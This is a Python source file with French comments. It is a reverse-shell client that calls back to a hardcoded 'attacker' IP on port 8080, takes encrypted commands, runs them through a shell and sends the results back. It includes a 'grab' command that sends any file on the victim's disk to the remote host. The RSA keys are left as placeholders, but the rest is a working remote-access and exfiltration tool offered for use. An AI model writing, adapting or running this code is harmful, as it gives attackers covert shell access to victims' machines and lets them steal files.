__author__ = "Dobidobe"

import socket
import subprocess
import os
from Crypto.PublicKey import RSA


def encrypt(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
INDIQUER RSA PUBLIC KEY
-----END PUBLIC KEY-----'''

    encryptor = RSA.importKey(publickey)
    encryptedData = encryptor.encrypt(message, 0)
    return encryptedData[0]


def decrypt(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
INDIQUER CLÉ PRIVÉE
-----END RSA PRIVATE KEY-----'''

    decrypteur = RSA.importKey(privatekey)
    return decrypteur.decrypt(cipher)


def transfer(s, path):
    if os.path.exists(str(path)):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send("EZIEST GAME OF MY EZ LIFE")
        f.close()

    else:
        s.send('Nothing to steal FeelsBadMan')


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('154.0.0.1', 8080))#adresse ip de l'attanquant

    while True:
        command = decrypt(s.recv(1024))

        if 'terminate' in command:
            s.close()
            break

        if 'grab' in command:
            # File transfer command
            grab, path = command.split('*')

            try:
                transfer(s, path)
            except Exception as e:
                s.send(str(e))
                pass

#Exception d'échec

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result = CMD.stdout.read()
            if len(result) > 512:
                for i in range(0, len(result), 512):
                    dobe = result[0 + i:512 + i]
                    s.send(encrypt(dobe))
            else:
                s.send(encrypt(result))


def main():
    connect()


if __name__ == '__main__':
    main()
